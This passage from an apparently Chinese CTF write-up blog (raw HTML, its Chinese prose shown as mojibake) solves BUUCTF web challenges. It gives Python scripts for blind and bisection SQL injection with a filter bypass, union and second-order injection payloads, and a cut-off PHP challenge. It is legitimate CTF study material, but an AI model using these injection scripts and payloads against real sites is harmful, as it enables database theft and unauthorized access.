class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br>url = <span class="hljs-string">&#x27;http://687df149-6e4c-4d22-9035-80478f031581.node4.buuoj.cn:81/index.php&#x27;</span>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>):<br>    time.sleep(<span class="hljs-number">0.02</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br><br>        payload = <span class="hljs-string">&quot;if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i, j)<br>        data = &#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;<br>        res = requests.post(url=url, data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            flag = flag + <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-comment">#print(i)</span><br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>äºŒåˆ†æ³•è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒã€‚ã€‚è¿™ä¸ªè·‘çš„æœ‰ç‚¹æ…¢â•®(â•¯-â•°)â•­è€Œä¸”ä¼šè·‘å‡ºä¸æ­£ç¡®çš„å­—ç¬¦ã€‚ã€‚è¿™é‡Œå‚è€ƒäº†å…¶å®ƒå¸ˆå‚…åœ°é“äºŒåˆ†æ³•è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å‚è€ƒhttps://blog.csdn.net/l2872253606/article/details/125247898</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&#x27;http://51803b08-9d22-46c8-b50e-33d3fe778c2b.node4.buuoj.cn:81/&#x27;</span><br>f=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    time.sleep(<span class="hljs-number">0.02</span>)<br><br>    <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span>=<span class="hljs-number">127</span><br>    mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        payload=<span class="hljs-string">&quot;1^(ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(mid)) <span class="hljs-comment">#give_grandpa_pa_pa_pa</span><br>        <span class="hljs-comment">#payload = &quot;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(str(i), str(mid))#f1ag_1s_h3r3_hhhhh,users233333333333333</span><br>        data=&#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:payload<br>        &#125;<br>        s=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> s.text:<br>            <span class="hljs-built_in">min</span>=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span>=mid<br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>    f+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(f)<br><br></code></pre></td></tr></table></figure><p><code>give_grandpa_pa_pa_pa</code></p><p>FUZZçš„æ—¶å€™è¿‡æ»¤äº†<code>information_schema</code>ï¼Œæ‰€ä»¥ç”¨<code>sys.schema_table_statistics_with_buffer</code>ä»£æ›¿<code>information_schema.tables</code>ã€‚ä½†æœ€ç»ˆçˆ†åˆ—çš„æ—¶å€™è¿˜æ˜¯è¦ç”¨åˆ°<code>infomation_schema</code>è¿™ä¸œè¥¿ï¼Œæ‰€ä»¥å¾—è€ƒè™‘å…¶å®ƒæ³¨å…¥æ–¹å¼ï¼Œè¿™é‡Œç”¨åˆ°äº†æ— åˆ—åæ³¨å…¥å’Œ<code>ASCII</code>åç§»ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;abcdefg&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;c&#x27;</span>)<br>#è¿”å›<span class="hljs-number">0</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;bb&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;ba&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;bb&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ba&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;bb&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>,<span class="hljs-string">&#x27;ba&#x27;</span>)<br>#è¿”å›<span class="hljs-number">0</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;a&#x27;</span>)<br>#è¿”å›<span class="hljs-number">0</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;a&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;~&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;f&#x27;</span>)<br>#è¿”å›<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><blockquote><p>æ¯”è¾ƒçš„æ—¶å€™ï¼Œ1&#x3D;â€™1â€™ï¼Œä½†â€™1â€™&lt;â€™aâ€™ï¼Œä¸”1&gt;â€™aâ€™ï¼Œç»æµ‹å¯çŸ¥ï¼Œæ•°å­—&gt;å­—ç¬¦ã€‚</p></blockquote><p>æ‰€ä»¥å¯ä»¥ç”¨å¦‚ä¸‹æ–¹æ³•æµ‹è¯•åˆ—æ•°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-number">1</span><span class="hljs-operator">^</span>((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-operator">&gt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<span class="hljs-operator">^</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-operator">^</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-operator">&gt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span><br>payload=<span class="hljs-string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>        hexchar=flag+<span class="hljs-built_in">chr</span>(i)<br>        py=payload.<span class="hljs-built_in">format</span>(hexchar)<br>        datas=&#123;<span class="hljs-string">&#x27;id&#x27;</span>:py&#125;<br>        re=requests.post(url=url,data=datas)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag+=<span class="hljs-built_in">chr</span>(i-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#æˆ–è€…</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_hex</span>(<span class="hljs-params">s</span>):  <span class="hljs-comment"># åå…­è¿›åˆ¶è½¬æ¢ fl ==&gt; 0x666cï¼Œå¯ä»¥é¿å…ä¸€äº›å¦‚&quot;fla&quot;&quot;è¿™ç§ç¬¦å·é—®é¢˜å¯¼è‡´æ‰§è¡Œé”™è¯¯ä»¥åŠæ£€æµ‹bypass</span><br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    res = <span class="hljs-string">&#x27;0x&#x27;</span> + res<br>    <span class="hljs-keyword">return</span> res<br><br><br>url = <span class="hljs-string">&quot;http://3a960679-ba2d-46e9-8e31-605a16a949a9.node4.buuoj.cn:81/&quot;</span><br>s = <span class="hljs-string">&quot;&quot;</span><br>last = <span class="hljs-string">&#x27;tmp&#x27;</span><br><span class="hljs-keyword">while</span>(s.strip() != last):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        flag = s + <span class="hljs-built_in">chr</span>(j)<br>        payload = <span class="hljs-string">&quot;1^((1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1&quot;</span>.<span class="hljs-built_in">format</span>(to_hex(flag))<br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload<br>        &#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> r.content:<br>            last = s.strip()<br>            s += <span class="hljs-built_in">chr</span>(j-<span class="hljs-number">1</span>)  <span class="hljs-comment"># &#x27;F&#x27;&lt;&#x27;FLAG&#x27;,&#x27;G&#x27;&gt;&#x27;FLAG&#x27;,æ‰€ä»¥è¦å‡1</span><br>            <span class="hljs-built_in">print</span>(s.lower())<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>åŒ¹é…flagçš„æ—¶å€™ï¼Œä¸€å®šä¼šå…ˆç»è¿‡åŒ¹é…åˆ°å­—ç¬¦ç›¸ç­‰çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™è¿”å›çš„æ˜¯0ã€‚å¾ˆæ˜æ˜¾æ­¤æ—¶çš„chr(char)å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬åœ¨è¾“å‡º1(Nu1L)çš„æ—¶å€™ï¼ŒåŒ¹é…çš„æ˜¯fçš„ä¸‹ä¸€ä¸ªå­—ç¬¦gï¼Œè€Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯fï¼Œæ­¤æ—¶chr(char-1)&#x3D;â€™fâ€™ï¼Œæ‰€ä»¥è¿™é‡Œè¦ç”¨chr(char-1)ã€‚</p><p>çœ‹äº†wpè¿˜æœ‰è¿™ç§æ–¹å¼ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>import requests<br>url = <span class="hljs-string">&quot;http://2070e1dc-ce1b-4d1c-ae33-f747d0ae05e8.node3.buuoj.cn/index.php&quot;</span><br>payload1 = <span class="hljs-string">&quot;if((ascii(substr(database(),&quot;</span><br>payload2 = <span class="hljs-string">&quot;,1))=&quot;</span><br>payload3 = <span class="hljs-string">&quot;),1,2)&quot;</span><br>name = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">22</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>,<span class="hljs-number">123</span>):<br>        payload = payload1+<span class="hljs-built_in">str</span>(i)+payload2+<span class="hljs-built_in">str</span>(j)+payload3<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>        s = requests<span class="hljs-selector-class">.post</span>(url,data=data)<span class="hljs-selector-class">.text</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> s):<br>            name += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            break<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_45521281/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106647880</span><br>https:<span class="hljs-regexp">//</span>syunaht.com<span class="hljs-regexp">/p/</span><span class="hljs-number">1354079185</span>.html<br>https:<span class="hljs-regexp">//</span>www.shawroot.cc/<span class="hljs-number">1186</span>.html<br></code></pre></td></tr></table></figure><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p><img src="/img/lifeonmars1.png" alt="lifeonmars1"></p><p>æºç å¥½åƒæ²¡å•¥ä¿¡æ¯ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img src="/img/lifeonmars2.png" alt="lifeonmars2"></p><p>æ³¨æ„è¿™ä¸ª<code>URL:/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1703252641401</code></p><p>åœ¨ç¬¬ä¸€ä¸ªå­—æ®µåŠ äº†ä¸ª<code>&#39;%23</code>:</p><p><img src="/img/lifeonmars3.png" alt="lifeonmars3"></p><p>æœ‰ååº”ï¼ŒæŠŠå•å¼•å·ç›´æ¥å»äº†ï¼š</p><p><img src="/img/lifeonmars5.png" alt="lifeonmars5"></p><p><code>%23</code>è¿™ä¸ªæ³¨é‡Šç¬¦ç¡®å®èµ·ä½œç”¨äº†ã€‚åŠ äº†æ³¨é‡Šç¬¦ç›´æ¥æŠŠåé¢å…¨åˆ æ‰å›æ˜¾ä¹Ÿæ˜¯æ­£å¸¸çš„ã€‚åé¢æƒ³ç€ç›´æ¥oder by åˆ¤æ–­åˆ—æ•°äº†ï¼Œä½†burpä¸Šæ“ä½œä¸€ç›´ç»™æˆ‘å›æ˜¾400ï¼Œä»–å¦ˆçš„ã€‚åªèƒ½ç›´æ¥åœ¨ç½‘é¡µæ“ä½œï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">/query?<span class="hljs-attr">search=</span>olympus_mons <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>2æ—¶å›æ˜¾æ­£å¸¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/query?search=olympus_mons union <span class="hljs-keyword">select</span> 123,456<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/img/lifeonmars6.png" alt="lifeonmars6"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/query?<span class="hljs-keyword">search</span>=olympus_mons <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version(),<span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p>æ•°æ®åº“:<code>aliens</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/query?<span class="hljs-keyword">search</span>=amazonis_planitia <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;aliens&#x27;</span><br></code></pre></td></tr></table></figure><p>è¡¨ä¸€å¤§å †ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">amazonis_planitia,</span>arabi<span class="hljs-built_in">a_terra</span>,chryse_planitia,hellas_basin,hesperi<span class="hljs-built_in">a_planum</span>,noachis_terra,olympus_mons,tharsis_rise,utopi<span class="hljs-built_in">a_basin</span><br></code></pre></td></tr></table></figure><p>åé¢æ‡’å¾—æŸ¥äº†ç›´æ¥æ‰¾äº†<code>wp</code>ã€‚ã€‚è¿™ä¸œè¥¿èƒ½ç›´æ¥ç”¨<code>sqlmap</code>è·‘å‡ºæ¥è€Œä¸”è¡¨ä¸æ˜¯<code>aliens</code>è€Œæ˜¯<code>alien_code</code>è¿™ä¸ªåº“ï¼Œè€Œä¸”<code>code</code>è¿™ä¸ªè¡¨ä¸æ­¢ä¸€ä¸ªã€‚ã€‚æ‰€ä»¥è¦è¿™ä¹ˆæŸ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/query?search=amazonis_planitia union <span class="hljs-keyword">select</span> 1,group_concat(<span class="hljs-built_in">id</span>,code) from alien_code.code<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>å”‰ï¼Œä¸€ä¸ªç®€å•çš„äºŒæ¬¡æ³¨å…¥ï¼Œç»“æœè¢«æˆ‘æƒ³éº»çƒ¦äº†æµªè´¹å¥½é•¿æ—¶é—´ã€‚</p><p>å…ˆæ³¨å†Œäº†<code>admin</code>,<code>admin</code>ã€‚<code>info</code>é‚£é‡Œæ”¾äº†ä¸ª<code>1</code>ã€‚ç„¶åæ³¨å†Œäº†<code>admin&#39;#``admin</code>ï¼Œç™»è¿›å»å‘ç°<code>info</code>å­—æ®µæœ‰ä¸œè¥¿ï¼š</p><p><img src="/img/octtwicesql1.png" alt="octtwicesql1"></p><p>æˆ‘æ³¨å†Œçš„<code>admin&#39;#</code>ç™»å½•æˆäº†<code>admin</code>ç”¨æˆ·äº†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ç™»å½•çš„é”…ï¼š<code>&#39;#</code>ç›´æ¥æŠŠåé¢çš„éƒ½æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥å°è¯•äº†<code>admin&#39;#</code>ç„¶åè¾“ä¸ªé”™è¯¯çš„å¯†ç çœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•ï¼š</p><p>å¹²ï¼Œç™»ä¸ä¸Šå»ã€‚</p><p>åé¢æƒ³äº†æƒ³åº”è¯¥æ˜¯ç™»å½•æ—¶å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼šæŠŠè¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç å­˜èµ·æ¥ç„¶åå–å‡ºï¼Œ<code>admin&#39;#</code>å°±å˜æˆ<code>admin</code>äº†ã€‚ä½†è¿™é‡Œæ€ä¹ˆåˆ©ç”¨æ˜¯ä¸ªé—®é¢˜ã€‚ã€‚</p><p>æˆ‘ä¸€å¼€å§‹ä»¥ä¸ºè¦æ ¹æ®é¡µé¢å›æ˜¾å»ä¸€ç‚¹ä¸€ç‚¹åˆ¤æ–­ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))=99,1,2)#</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®ç™»å½•åçš„é¡µé¢ä¸­<code>info</code>çš„å†…å®¹æ˜¯å¦å’Œç”¨æˆ·å<code>1</code>çš„å†…å®¹ä¸€æ ·åˆ¤æ–­ï¼š</p><p>å¦‚æœ<code>if</code>è¿™ä¸ªæ¡ä»¶æ˜¯å¯¹çš„<code>info</code>å­—æ®µå°±ä¼šå›æ˜¾å’Œ<code>1</code>åŒæ ·çš„å†…å®¹ã€‚ä½†è¿™æ„å‘³ç€æˆ‘å¯¹æ¯ä¸ª<code>payload</code>éƒ½è¦è¿›è¡Œï¼šæ³¨å†ŒåŠ ç™»å½•çš„æ“ä½œã€‚ã€‚</p><p>åé¢çœ‹äº†<code>wp</code>ï¼ŒğŸçš„è¿™é‡Œç›´æ¥ç”¨<code>UNION</code>å°±ç›´æ¥èƒ½å›æ˜¾ï¼š</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">12345</span> <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/img/octtwicesql2.png" alt="octtwicesql2"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>çˆ†åº“ï¼šctftraining<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select database() #</span><br><span class="hljs-string">//çˆ†è¡¨</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ctftraining&#x27;</span> #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>çˆ†åˆ—<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">//flag</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag #<br><br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</h2><p>è¿›å»ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œ<code>hint</code>æç¤ºæ¢ä¸€ç§è¯·æ±‚æ–¹å¼ï¼Œæ”¹æˆPOSTï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span 